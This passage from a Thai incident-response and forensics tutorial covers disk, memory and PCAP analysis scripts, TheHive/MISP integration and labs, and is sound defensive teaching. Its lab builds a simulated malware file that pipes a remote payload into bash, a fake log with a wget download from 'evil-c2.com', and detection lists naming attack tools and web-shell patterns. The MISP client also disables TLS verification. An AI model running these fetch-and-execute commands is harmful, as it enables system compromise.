        Cause("ไม่มีโปรแกรม Security Awareness Training", CauseType.PROCESS, is_root_cause=True,
              remediation="จัดทำ quarterly phishing simulation และ training"),
        Cause("Email gateway ไม่มี sandboxing", CauseType.TECHNICAL, contributing_factor=True,
              remediation="Deploy email sandboxing solution"),
        Cause("Network segmentation ไม่เพียงพอ", CauseType.TECHNICAL, contributing_factor=True,
              remediation="Implement network segmentation และ micro-segmentation"),
    ]
    
    # Lessons Learned
    rca.lessons_learned = [
        "Security Awareness Training เป็นสิ่งจำเป็น ไม่ใช่ optional",
        "Email sandboxing ป้องกัน phishing ได้ดีกว่า signature-based",
        "Backup strategy ต้องทดสอบ recovery regularly",
        "Network segmentation ช่วย limit blast radius"
    ]
    
    # Action Items
    rca.add_action_item("Deploy email sandboxing", "IT Security", "2024-02-01", "High")
    rca.add_action_item("จัดอบรม Phishing Awareness", "HR + IT", "2024-01-15", "Critical")
    rca.add_action_item("Implement network segmentation", "Network Team", "2024-03-01", "High")
    rca.add_action_item("ทดสอบ Backup Recovery", "IT Ops", "2024-01-31", "Medium")
    
    print(rca.generate_report())
```

---

## 7. Digital Forensics Basics

### Disk Forensics กับ Sleuth Kit

```bash
# ===== Disk Forensics Workflow =====

# 1. สร้าง forensic image (ไม่แก้ไขต้นฉบับ)
dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress

# หรือใช้ dcfldd (ดีกว่า dd)
apt install dcfldd
dcfldd if=/dev/sda of=/evidence/disk.img hash=sha256 hashlog=/evidence/disk.sha256

# ตรวจสอบ integrity
sha256sum /evidence/disk.img

# 2. Mount image แบบ read-only
mkdir -p /mnt/forensic
mount -o loop,ro /evidence/disk.img /mnt/forensic

# หรือใช้ specific partition
fdisk -l /evidence/disk.img  # ดู partition table
OFFSET=$((512 * 2048))  # sector size * start sector
mount -o loop,ro,offset=$OFFSET /evidence/disk.img /mnt/forensic

# 3. Sleuth Kit analysis
# ดูข้อมูลระบบไฟล์
fsstat /evidence/disk.img

# list files รวม deleted
fls -r -d /evidence/disk.img  # -d = deleted files

# ดู specific inode
icat /evidence/disk.img 12345  # อ่านไฟล์จาก inode number

# ค้นหา file type
fls -r /evidence/disk.img | grep \.exe

# ===== Timeline Analysis =====
# สร้าง filesystem timeline
fls -r -m '/' /evidence/disk.img > /evidence/bodyfile.txt
mactime -b /evidence/bodyfile.txt -d > /evidence/timeline.csv

# กรอง timeline ช่วงเวลาที่สนใจ
mactime -b /evidence/bodyfile.txt -d 2024-01-01 2024-01-31 > /evidence/timeline_jan.csv

# ===== File Recovery =====
# กู้ไฟล์ที่ถูกลบ
foremost -t all -i /evidence/disk.img -o /evidence/recovered/

# หรือใช้ photorec
photorec /evidence/disk.img

# ===== Metadata Analysis =====
# ดู metadata ของไฟล์
exiftool /evidence/suspicious_file.pdf

# ดู EXIF ของรูปภาพ
exiftool /evidence/*.jpg | grep -E 'GPS|Create|Modify'

# ===== String Analysis =====
# หา strings ที่น่าสนใจ
strings /evidence/malware.bin | grep -E 'http|cmd|powershell|exec'
strings -e l /evidence/malware.bin  # Unicode strings

# ===== Hash Analysis =====
# คำนวณ hashes
md5sum /evidence/suspicious_file > /evidence/suspicious_file.md5
sha256sum /evidence/suspicious_file >> /evidence/suspicious_file.sha256

# ตรวจสอบกับ VirusTotal (ต้องการ API key)
curl -s -X POST 'https://www.virustotal.com/vtapi/v2/file/report' \
    --form apikey='YOUR_API_KEY' \
    --form resource='HASH_VALUE'
```

### Autopsy Forensics Platform

```bash
# ===== Autopsy GUI Setup =====
# ติดตั้ง Autopsy
apt install autopsy

# เปิด Autopsy
autopsy &

# Web interface จะเปิดที่ http://localhost:9999/autopsy

# ===== Autopsy CLI (SleuthKit) =====
# สร้าง case
mkdir -p /cases/INC-2024-001

# วิเคราะห์ด้วย Autopsy batch mode
autopsy -m CASE_NAME=/cases/INC-2024-001 \
        IBASE=/evidence/ \
        ITYPE=raw \
        FNAME=disk.img
```

---

## 8. Memory Forensics

### Volatility 3 Memory Analysis

```bash
# ===== Memory Acquisition =====
# Linux - ใช้ LiME (Linux Memory Extractor)
modprobe lime
insmod lime.ko "path=/evidence/memory.lime format=lime"

# หรือ avml
avml /evidence/memory.avml

# Windows
winpmem_1.6.2.exe /evidence/memory.raw

# ===== Volatility 3 Basic Analysis =====
# ตรวจสอบ OS profile
vol.py -f /evidence/memory.lime banners.Banners

# List processes
vol.py -f /evidence/memory.lime linux.pslist
vol.py -f /evidence/memory.lime linux.pstree

# Find hidden processes
vol.py -f /evidence/memory.lime linux.psscan

# Network connections
vol.py -f /evidence/memory.lime linux.netstat

# List open files
vol.py -f /evidence/memory.lime linux.lsof

# ===== Malware Analysis =====
# ค้นหา injected code
vol.py -f /evidence/memory.lime linux.malfind

# Dump process memory
vol.py -f /evidence/memory.lime linux.memmap --pid 1234 --dump

# ดู bash history จาก memory
vol.py -f /evidence/memory.lime linux.bash

# ดู environment variables
vol.py -f /evidence/memory.lime linux.envars --pid 1234

# ===== Windows Memory Analysis =====
vol.py -f /evidence/memory.raw windows.pslist
vol.py -f /evidence/memory.raw windows.psscan  # รวม hidden
vol.py -f /evidence/memory.raw windows.dlllist --pid 1234
vol.py -f /evidence/memory.raw windows.malfind
vol.py -f /evidence/memory.raw windows.netstat
vol.py -f /evidence/memory.raw windows.registry.hivelist
vol.py -f /evidence/memory.raw windows.registry.printkey --key 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'

# Dump DLL
vol.py -f /evidence/memory.raw windows.dlllist --pid 1234 --dump

# Dump executable
vol.py -f /evidence/memory.raw windows.pslist --pid 1234 --dump
```

### Automated Memory Analysis Script

```python
#!/usr/bin/env python3
# memory_analyzer.py - วิเคราะห์ memory dump อัตโนมัติ

import subprocess
import json
import re
from pathlib import Path
from typing import List, Dict

class MemoryAnalyzer:
    """วิเคราะห์ memory dump ด้วย Volatility 3"""
    
    def __init__(self, memory_file: str, output_dir: str = "/evidence/memory_analysis"):
        self.memory_file = memory_file
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.os_type = self._detect_os()
    
    def _detect_os(self) -> str:
        """ตรวจสอบ OS จาก memory dump"""
        result = self._run_vol("banners.Banners")
        output = result.get('output', '')
        
        if 'Linux' in output:
            return 'linux'
        elif 'Windows' in output:
            return 'windows'
        else:
            return 'unknown'
    
    def _run_vol(self, plugin: str, extra_args: str = "") -> Dict:
        """รัน Volatility plugin"""
        cmd = f"vol.py -f {self.memory_file} {plugin} {extra_args}"
        
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=300
            )
            return {
                'output': result.stdout,
                'error': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'output': '', 'error': 'Timeout', 'returncode': -1}
        except Exception as e:
            return {'output': '', 'error': str(e), 'returncode': -1}
    
    def get_process_list(self) -> List[Dict]:
        """ดึง process list"""
        plugin = f"{self.os_type}.pslist"
        result = self._run_vol(plugin)
        
        processes = []
        lines = result['output'].split('\n')
        
        for line in lines[2:]:  # Skip header
            parts = line.split()
            if len(parts) >= 3:
                processes.append({
                    'pid': parts[0] if parts else '',
                    'name': parts[1] if len(parts) > 1 else '',
                    'ppid': parts[2] if len(parts) > 2 else ''
                })
        
        return processes
    
    def find_suspicious_processes(self) -> List[Dict]:
        """หา processes ที่น่าสงสัย"""
        suspicious = []
        processes = self.get_process_list()
        
        suspicious_names = [
            'mimikatz', 'meterpreter', 'nc', 'netcat', 'ncat',
            'cmd.exe', 'powershell', 'wscript', 'cscript',
            'regsvr32', 'mshta', 'certutil'
        ]
        
        # ตรวจสอบ malfind
        plugin = f"{self.os_type}.malfind"
        malfind_result = self._run_vol(plugin)
        
        # Parse malfind output
        pid_pattern = re.compile(r'PID:\s+(\d+)')
        name_pattern = re.compile(r'Process:\s+(\S+)')
        
        for line in malfind_result['output'].split('\n'):
            pid_match = pid_pattern.search(line)
            name_match = name_pattern.search(line)
            
            if pid_match or name_match:
                suspicious.append({
                    'type': 'malfind',
                    'pid': pid_match.group(1) if pid_match else '',
                    'name': name_match.group(1) if name_match else '',
                    'line': line
                })
        
        return suspicious
    
    def extract_network_connections(self) -> List[Dict]:
        """ดึง network connections"""
        plugin = f"{self.os_type}.netstat"
        result = self._run_vol(plugin)
        
        connections = []
        for line in result['output'].split('\n'):
            if re.search(r'\d+\.\d+\.\d+\.\d+', line):
                connections.append({'connection': line})
        
        return connections
    
    def full_analysis(self) -> Dict:
        """ทำการวิเคราะห์ทั้งหมด"""
        print(f"[*] Starting memory analysis: {self.memory_file}")
        print(f"[*] Detected OS: {self.os_type}")
        
        report = {
            'memory_file': self.memory_file,
            'os_type': self.os_type,
            'findings': []
        }
        
        print("[*] Extracting process list...")
        processes = self.get_process_list()
        report['process_count'] = len(processes)
        
        print("[*] Looking for suspicious processes...")
        suspicious = self.find_suspicious_processes()
        if suspicious:
            report['findings'].append({
                'type': 'SUSPICIOUS_PROCESSES',
                'count': len(suspicious),
                'details': suspicious
            })
        
        print("[*] Extracting network connections...")
        connections = self.extract_network_connections()
        report['network_connections'] = len(connections)
        
        # Save report
        report_file = self.output_dir / 'memory_analysis.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Analysis complete. Report: {report_file}")
        return report


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    analyzer = MemoryAnalyzer(
        memory_file="/evidence/memory.lime",
        output_dir="/evidence/memory_analysis"
    )
    
    report = analyzer.full_analysis()
    
    print(f"\nSummary:")
    print(f"  OS: {report['os_type']}")
    print(f"  Processes: {report.get('process_count', 0)}")
    print(f"  Network Connections: {report.get('network_connections', 0)}")
    print(f"  Suspicious Findings: {len(report.get('findings', []))}")
```

---

## 9. Network Forensics

### PCAP Analysis

```python
#!/usr/bin/env python3
# pcap_analyzer.py - วิเคราะห์ network captures

import pyshark
from collections import Counter, defaultdict
from typing import List, Dict
import ipaddress
import json

class PCAPAnalyzer:
    """วิเคราะห์ PCAP files เพื่อหาสัญญาณการโจมตี"""
    
    def __init__(self, pcap_file: str):
        self.pcap_file = pcap_file
        self.packets = []
        self.suspicious_findings = []
    
    def analyze(self) -> Dict:
        """วิเคราะห์ PCAP file ทั้งหมด"""
        cap = pyshark.FileCapture(self.pcap_file)
        
        ip_counter = Counter()
        protocol_counter = Counter()
        port_counter = Counter()
        dns_queries = []
        http_requests = []
        large_transfers = []
        
        for packet in cap:
            try:
                # Count protocols
                protocol_counter[packet.highest_layer] += 1
                
                # IP layer
                if hasattr(packet, 'ip'):
                    src = packet.ip.src
                    dst = packet.ip.dst
                    ip_counter[src] += 1
                    ip_counter[dst] += 1
                
                # TCP/UDP ports
                if hasattr(packet, 'tcp'):
                    port_counter[packet.tcp.dstport] += 1
                elif hasattr(packet, 'udp'):
                    port_counter[packet.udp.dstport] += 1
                
                # DNS queries
                if hasattr(packet, 'dns') and hasattr(packet.dns, 'qry_name'):
                    dns_queries.append({
                        'query': packet.dns.qry_name,
                        'time': packet.sniff_time.isoformat()
                    })
                
                # HTTP requests
                if hasattr(packet, 'http'):
                    if hasattr(packet.http, 'request_uri'):
                        http_requests.append({
                            'method': getattr(packet.http, 'request_method', ''),
                            'host': getattr(packet.http, 'host', ''),
                            'uri': packet.http.request_uri,
                            'time': packet.sniff_time.isoformat()
                        })
                
                # Large data transfers (potential exfiltration)
                if hasattr(packet, 'length') and int(packet.length) > 10000:
                    large_transfers.append({
                        'size': int(packet.length),
                        'src': getattr(getattr(packet, 'ip', None), 'src', ''),
                        'dst': getattr(getattr(packet, 'ip', None), 'dst', '')
                    })
                    
            except Exception:
                pass
        
        cap.close()
        
        # วิเคราะห์ผลลัพธ์
        self._analyze_dns(dns_queries)
        self._analyze_http(http_requests)
        self._analyze_connections(ip_counter, port_counter)
        
        return {
            'top_talkers': ip_counter.most_common(10),
            'protocols': dict(protocol_counter.most_common(20)),
            'top_ports': port_counter.most_common(20),
            'dns_queries': dns_queries[:100],
            'http_requests': http_requests[:100],
            'large_transfers': large_transfers[:20],
            'suspicious_findings': self.suspicious_findings
        }
    
    def _analyze_dns(self, queries: List[Dict]):
        """วิเคราะห์ DNS เพื่อหา DGA/tunneling"""
        domain_lengths = [len(q['query'].split('.')[0]) for q in queries]
        
        # DGA detection: domains ที่ยาวผิดปกติหรือมีตัวเลขเยอะ
        for query in queries:
            domain = query['query']
            subdomain = domain.split('.')[0]
            
            # ตรวจสอบความยาว
            if len(subdomain) > 30:
                self.suspicious_findings.append({
                    'type': 'POSSIBLE_DGA',
                    'description': f'Unusually long subdomain: {domain}'
                })
            
            # ตรวจสอบ entropy สูง (DGA)
            import math
            if len(subdomain) > 8:
                freq = Counter(subdomain.lower())
                entropy = -sum((c/len(subdomain)) * math.log2(c/len(subdomain)) 
                              for c in freq.values())
                if entropy > 3.5:
                    self.suspicious_findings.append({
                        'type': 'HIGH_ENTROPY_DNS',
                        'description': f'High entropy domain (possible DGA/tunnel): {domain}',
                        'entropy': entropy
                    })
    
    def _analyze_http(self, requests: List[Dict]):
        """วิเคราะห์ HTTP traffic"""
        # Web shell patterns
        suspicious_patterns = [
            'cmd=', 'exec=', 'system(', 'passthru(',
            '../', 'etc/passwd', 'cmd.exe',
            'base64', 'eval('
        ]
        
        for req in requests:
            uri = req.get('uri', '')
            for pattern in suspicious_patterns:
                if pattern.lower() in uri.lower():
                    self.suspicious_findings.append({
                        'type': 'SUSPICIOUS_HTTP_REQUEST',
                        'description': f'Suspicious HTTP request: {uri}',
                        'pattern': pattern
                    })
                    break
    
    def _analyze_connections(self, ip_counter: Counter, port_counter: Counter):
        """วิเคราะห์ connections"""
        # Common C2 ports
        c2_ports = ['4444', '4445', '1337', '31337', '8888', '9001', '9002']
        
        for port in c2_ports:
            if port in port_counter:
                self.suspicious_findings.append({
                    'type': 'SUSPICIOUS_PORT',
                    'description': f'Traffic on common C2 port: {port}',
                    'count': port_counter[port]
                })


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    import sys
    
    pcap_file = sys.argv[1] if len(sys.argv) > 1 else '/evidence/capture.pcap'
    
    print(f"[*] Analyzing PCAP: {pcap_file}")
    analyzer = PCAPAnalyzer(pcap_file)
    
    try:
        results = analyzer.analyze()
        
        print("\n[+] Analysis Results:")
        print(f"    Suspicious Findings: {len(results['suspicious_findings'])}")
        
        print("\nTop Talkers:")
        for ip, count in results['top_talkers']:
            print(f"    {ip}: {count} packets")
        
        print("\nTop Ports:")
        for port, count in results['top_ports'][:5]:
            print(f"    Port {port}: {count} connections")
        
        if results['suspicious_findings']:
            print("\n[!] Suspicious Findings:")
            for finding in results['suspicious_findings']:
                print(f"    [{finding['type']}] {finding['description']}")
    except Exception as e:
        print(f"[-] Error analyzing PCAP: {e}")
        print("[*] Note: Requires pyshark library and Wireshark/tshark")
```

---

## 10. IR Automation Tools

### TheHive Integration

```python
#!/usr/bin/env python3
# thehive_integration.py - ส่ง alerts ไปยัง TheHive

import requests
import json
from datetime import datetime
from typing import Dict, List, Optional

class TheHiveClient:
    """Client สำหรับ TheHive SIRP"""
    
    def __init__(self, url: str, api_key: str):
        self.url = url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        }
    
    def create_case(self, title: str, description: str, 
                    severity: int = 2, tags: List[str] = None) -> Dict:
        """สร้าง case ใหม่ใน TheHive"""
        case_data = {
            'title': title,
            'description': description,
            'severity': severity,  # 1=Low, 2=Medium, 3=High, 4=Critical
            'tlp': 2,  # TLP:WHITE
            'tags': tags or [],
            'startDate': int(datetime.now().timestamp() * 1000)
        }
        
        response = requests.post(
            f"{self.url}/api/case",
            headers=self.headers,
            json=case_data
        )
        response.raise_for_status()
        return response.json()
    
    def add_observable(self, case_id: str, observable_type: str, 
                       value: str, tags: List[str] = None) -> Dict:
        """เพิ่ม observable (IOC) เข้า case"""
        observable_data = {
            'dataType': observable_type,  # ip, domain, hash, url, etc.
            'data': value,
            'tags': tags or [],
            'tlp': 2
        }
        
        response = requests.post(
            f"{self.url}/api/case/{case_id}/artifact",
            headers=self.headers,
            json=observable_data
        )
        response.raise_for_status()
        return response.json()
    
    def create_task(self, case_id: str, title: str, 
                    description: str = "", assignee: str = None) -> Dict:
        """สร้าง task ใน case"""
        task_data = {
            'title': title,
            'description': description,
            'status': 'Waiting'
        }
        if assignee:
            task_data['assignee'] = assignee
        
        response = requests.post(
            f"{self.url}/api/case/{case_id}/task",
            headers=self.headers,
            json=task_data
        )
        response.raise_for_status()
        return response.json()
    
    def auto_create_incident(self, incident_data: Dict) -> str:
        """สร้าง full incident case จาก data"""
        # สร้าง case
        case = self.create_case(
            title=incident_data['title'],
            description=incident_data['description'],
            severity=incident_data.get('severity', 2),
            tags=incident_data.get('tags', [])
        )
        
        case_id = case['id']
        print(f"[+] Case created: {case_id}")
        
        # เพิ่ม IOCs
        for ioc in incident_data.get('iocs', []):
            ioc_parts = ioc.split(':', 1)
            if len(ioc_parts) == 2:
                ioc_type, ioc_value = ioc_parts
                self.add_observable(case_id, ioc_type, ioc_value)
                print(f"[+] Observable added: {ioc}")
        
        # สร้าง tasks
        default_tasks = [
            ("Identification & Triage", "ระบุและประเมินความรุนแรง"),
            ("Containment", "ควบคุมการแพร่กระจาย"),
            ("Evidence Collection", "เก็บหลักฐาน"),
            ("Eradication", "ลบ malware และปิดช่องโหว่"),
            ("Recovery", "กู้คืนระบบ"),
            ("Post-Incident Review", "ทำ RCA และ lessons learned")
        ]
        
        for task_title, task_desc in default_tasks:
            self.create_task(case_id, task_title, task_desc)
        
        print(f"[+] Case fully created with {len(default_tasks)} tasks")
        return case_id


# MISP Integration สำหรับ Threat Intelligence
class MISPClient:
    """Client สำหรับ MISP Threat Intelligence Platform"""
    
    def __init__(self, url: str, api_key: str):
        self.url = url.rstrip('/')
        self.headers = {
            'Authorization': api_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
    
    def search_ioc(self, value: str) -> List[Dict]:
        """ค้นหา IOC ใน MISP"""
        data = {'value': value, 'returnFormat': 'json'}
        
        response = requests.post(
            f"{self.url}/attributes/restSearch",
            headers=self.headers,
            json=data,
            verify=False
        )
        
        if response.ok:
            result = response.json()
            return result.get('response', {}).get('Attribute', [])
        return []
    
    def create_event(self, info: str, threat_level: int = 2,
                     distribution: int = 0) -> Dict:
        """สร้าง MISP event"""
        event_data = {
            'Event': {
                'info': info,
                'threat_level_id': threat_level,
                'distribution': distribution,
                'analysis': 2  # Completed
            }
        }
        
        response = requests.post(
            f"{self.url}/events/add",
            headers=self.headers,
            json=event_data,
            verify=False
        )
        response.raise_for_status()
        return response.json()
    
    def add_attribute(self, event_id: str, attr_type: str, 
                      value: str, to_ids: bool = True) -> Dict:
        """เพิ่ม attribute (IOC) เข้า event"""
        attr_data = {
            'Attribute': {
                'type': attr_type,
                'value': value,
                'to_ids': to_ids,
                'distribution': 0
            }
        }
        
        response = requests.post(
            f"{self.url}/attributes/add/{event_id}",
            headers=self.headers,
            json=attr_data,
            verify=False
        )
        response.raise_for_status()
        return response.json()


# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    # TheHive
    thehive = TheHiveClient(
        url="http://thehive:9000",
        api_key="YOUR_API_KEY"
    )
    
    # สร้าง incident case
    incident = {
        'title': 'Ransomware on FILESERVER-01',
        'description': 'พบ ransomware เข้ารหัสไฟล์บน FILESERVER-01',
        'severity': 4,  # Critical
        'tags': ['ransomware', 'windows', 'fileserver'],
        'iocs': [
            'ip:192.168.1.100',
            'domain:evil-c2.com',
            'hash:abc123def456'
        ]
    }
    
    print("[*] TheHive Integration Demo")
    print("[*] Would create case with:")
    print(f"    Title: {incident['title']}")
    print(f"    Severity: Critical")
    print(f"    IOCs: {len(incident['iocs'])}")
    print(f"    Tasks: 6 default IR tasks")
```

---

## แบบฝึกหัด

### Lab 66.1: Incident Response Simulation

```bash
# ===== Lab Setup: สร้าง simulated incident =====

# 1. สร้าง "compromised" environment
mkdir -p /lab/incident_sim

# สร้าง fake malware files
echo '#!/bin/bash\n# malware.sh\ncurl -s http://192.168.1.200/payload.sh | bash' \
    > /lab/incident_sim/malware.sh

# สร้าง fake cron job
echo '*/5 * * * * root /tmp/malware.sh' >> /lab/incident_sim/fake_crontab

# สร้าง fake auth.log
cat > /lab/incident_sim/auth.log << 'EOF'
Jan 15 10:00:01 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:00:03 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:00:05 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:00:07 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:00:09 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:00:11 server sshd[1234]: Accepted password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:05:00 server sudo: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/wget http://evil-c2.com/malware.sh
Jan 15 10:05:15 server sudo: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=chmod +x /tmp/malware.sh
EOF

# 2. รัน IR Log Analyzer
python3 /opt/ir/ir_log_analyzer.py /lab/incident_sim/auth.log

# 3. เก็บ evidence (dry run)
echo "[*] Collecting evidence from simulated incident..."
ls -la /lab/incident_sim/
md5sum /lab/incident_sim/*

# 4. วิเคราะห์ incident
python3 << 'EOF'
from incident_classifier import Incident, IncidentCategory

incident = Incident(
    id="LAB-001",
    title="SSH Brute Force + Malware Download",
    category=IncidentCategory.UNAUTHORIZED_ACCESS,
    description="พบ brute force SSH และดาวน์โหลด malware",
    affected_systems=["server-01"],
    affected_users=1,
    lateral_movement=False
)

incident.add_ioc("192.168.1.100", "ip")
incident.add_ioc("evil-c2.com", "domain")
incident.add_ioc("malware.sh", "filename")

incident.add_timeline_event("Brute force detected")
incident.add_timeline_event("Successful login after brute force")
incident.add_timeline_event("Malware download via sudo")

print(incident.generate_report())
EOF
```

### Lab 66.2: Memory Forensics

```bash
# ===== Lab: Memory Analysis =====

# 1. Dump memory (ต้องการ root)
# LiME installation
git clone https://github.com/504ensicsLabs/LiME /tmp/LiME
cd /tmp/LiME/src
make

# Dump memory
insmod lime.ko "path=/tmp/memory.lime format=lime"

# 2. Install Volatility 3
pip3 install volatility3

# 3. วิเคราะห์ memory
vol3 -f /tmp/memory.lime linux.pslist
vol3 -f /tmp/memory.lime linux.netstat
vol3 -f /tmp/memory.lime linux.bash

# 4. หา suspicious processes
vol3 -f /tmp/memory.lime linux.malfind

# 5. Dump process memory
vol3 -f /tmp/memory.lime linux.memmap --pid $(pgrep malware.sh) --dump
```

---

## สรุป

| Phase | เครื่องมือหลัก | เวลาเป้าหมาย |
|-------|---------------|---------------|
| Detection | SIEM, IDS/IPS, Log analysis | < 1 ชั่วโมง |
| Containment | Firewall, Network isolation | < 4 ชั่วโมง |
| Eradication | AV, EDR, Manual cleanup | < 24 ชั่วโมง |
| Recovery | Backup restore, Patch | < 72 ชั่วโมง |
| Lessons Learned | RCA, Reports | < 1 สัปดาห์ |

### IR Tools Stack

| เครื่องมือ | หน้าที่ | ระดับ |
|-----------|---------|-------|
| Volatility 3 | Memory Forensics | Advanced |
| Sleuth Kit/Autopsy | Disk Forensics | Intermediate |
| Wireshark/Pyshark | Network Forensics | Intermediate |
| TheHive | Case Management | Intermediate |
| MISP | Threat Intelligence | Advanced |
| Velociraptor | DFIR Platform | Advanced |
| YARA | Malware Detection | Intermediate |

---

← [Part 65: Custom Security Tools](Part-65-Custom-Tools.md) | [Part 67: Threat Hunting](Part-67-Threat-Hunting.md) →
